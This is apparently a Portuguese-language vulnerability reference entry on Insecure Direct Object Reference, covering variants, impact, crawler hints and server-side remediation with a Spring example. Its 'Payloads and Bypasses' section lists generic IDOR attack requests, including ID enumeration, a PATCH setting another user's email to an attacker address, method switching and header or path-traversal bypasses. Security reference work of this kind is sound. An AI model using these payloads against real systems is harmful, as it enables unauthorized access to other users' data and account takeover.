---
id: idor
title: "Insecure Direct Object Reference"
module: "idor"
severity: "MEDIUM"
cwe_id: "CWE-639"
cwe_title: "Authorization Bypass Through User-Controlled Key"
cvss_vector: "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
vrt_id: "broken_access_control.insecure_direct_object_references"
---

## Summary
A aplicação usa um identificador controlado pelo usuário para acessar objetos sem verificar se ele pertence ao usuário autenticado, permitindo ler, alterar ou excluir dados de terceiros.

## Description
IDOR é uma falha de controle de acesso em nível de objeto (BOLA, no OWASP API Top 10). O endpoint recebe um ID (`/api/users/123`, `?invoice_id=456`, `{"account_id": 789}`) e retorna o recurso correspondente sem validar ownership, tenant ou permissão. IDs sequenciais, UUIDs previsíveis (v1), hashes curtos e referências em GraphQL ampliam a facilidade de exploração.

Variações:
- **Horizontal:** usuário A acessa dados do usuário B no mesmo nível.
- **Vertical:** usuário comum acessa recurso administrativo.
- **Blind IDOR:** a resposta não retorna o objeto, mas a ação é executada (ex.: DELETE, PATCH).
- **IDOR em métodos:** GET é protegido, mas PUT/PATCH/DELETE não.
- **IDOR em lote:** arrays de IDs, exportações, relatórios e GraphQL `node(id:)`.
- **IDOR em arquivos:** download de faturas, anexos, backups e exports.

O bug é comum em APIs REST, GraphQL, mobile e integrações, especialmente quando a autorização é feita apenas no frontend ou no endpoint "pai".

## Impact
- Vazamento de PII, documentos, faturas, mensagens e dados financeiros de outros usuários.
- Alteração/exclusão de dados de terceiros e fraude.
- Account takeover quando o IDOR expõe e-mail, token ou permite troca de senha.
- Acesso a dados de outros tenants em SaaS.
- Impacto MEDIUM a CRITICAL, dependendo da sensibilidade e da capacidade de escrita.

## Payloads and Bypasses
```text
# Enumeração simples
GET /api/users/1001
GET /api/users/1002
GET /api/invoices/5544
GET /api/orders/98765

# Trocar ID no body
PATCH /api/users/1002
{"email":"atacante@evil.com"}

# Métodos alternativos quando GET é bloqueado
POST /api/users/1002
PUT /api/users/1002
PATCH /api/users/1002
DELETE /api/users/1002

# IDs em arrays / export
GET /api/invoices?ids=1001,1002,1003
POST /api/export {"ids":[1001,1002,1003]}

# UUID previsível (v1) / base64
GET /api/files/550e8400-e29b-11d4-a716-446655440000
GET /api/files/VXNlcjoxMjM=

# GraphQL
{ node(id:"VXNlcjoxMjM=") { ... on User { email role } } }
{ user(id:"1002") { email } }

# Path traversal em IDs
GET /api/users/../admin
GET /api/users/1002%2f..%2fadmin

# Parâmetros duplicados / mass assignment de referência
GET /api/profile?user_id=1001&user_id=1002
{"user_id":1001,"owner_id":1002}

# Mobile/API version bypass
GET /api/v1/users/1002
GET /api/v2/users/1002
GET /internal/users/1002
```

Bypasses de proteção:
```text
- Trocar GET por PUT/PATCH/DELETE
- Enviar ID no body JSON/XML em vez da URL
- Adicionar header X-Original-URL / X-Rewrite-URL
- Usar IDs de outro tenant, organização ou filial
- Alterar `role`/`is_admin` junto do ID
- Explorar endpoints de export, relatório, impressão e download
- Acessar via GraphQL quando REST está protegido (ou vice-versa)
- Forçar cache de resposta de outro usuário (combinar com cache poisoning)
```

Casos reais e mentalidade de ataque (RWBH): Uber (recibos/viagens), Zomato (perfis) e Yahoo (objetos de conta) exploraram IDs sequenciais, UUID previsível e troca de método; o atacante testa GET, PATCH, DELETE e exportações.

## Target Context (Crawler Hints)
- **Parâmetros comuns:** `id`, `user_id`, `account_id`, `customer_id`, `order_id`, `invoice_id`, `file_id`, `document_id`, `message_id`, `trip_id`, `receipt_id`, `tenant_id`, `org_id`, `uuid`, `uid`, `ref`, `key`, `token`.
- **Paths comuns:** `/api/users/{id}`, `/api/orders/{id}`, `/api/invoices/{id}`, `/api/files/{id}`, `/api/messages/{id}`, `/api/v1/accounts/{id}`, `/download`, `/export`, `/graphql`.
- **Sinais:** IDs sequenciais; UUIDv1; endpoints que retornam dados de outro usuário; GET protegido mas PATCH/DELETE não; ausência de verificação de tenant.

## Recommendation
1. Aplicar autorização em cada objeto, no servidor, verificando `owner_id`/`tenant_id` contra o usuário autenticado. Não confiar em IDs opacos nem no frontend.
2. Usar "deny by default": se o usuário não tem permissão explícita, retornar 404/403.
3. Centralizar a checagem em um serviço de autorização (policy engine) e cobrir todos os métodos e formatos (REST, GraphQL, mobile).
4. Preferir IDs opacos e aleatórios (UUIDv4/ULID) para reduzir enumeração; ainda assim, validar ownership.
5. Em GraphQL, validar autorização em cada resolver e no `node(id:)`; não expor campos administrativos.
6. Proteger endpoints de export/download com checagem de ownership e URLs assinadas de curta duração.
7. Auditar acessos e alertar sobre padrões de enumeração (muitos 403/404, varredura de IDs).
8. Exemplo Spring:
```java
@GetMapping("/api/invoices/{id}")
public Invoice getInvoice(@PathVariable Long id, @AuthenticationPrincipal User user) {
    Invoice invoice = repo.findById(id).orElseThrow(NotFoundException::new);
    if (!invoice.getOwnerId().equals(user.getId()) && !user.hasRole("ADMIN")) {
        throw new AccessDeniedException("forbidden");
    }
    return invoice;
}
```
9. Criar testes automatizados que tentem acessar recursos de outro usuário em todos os métodos.
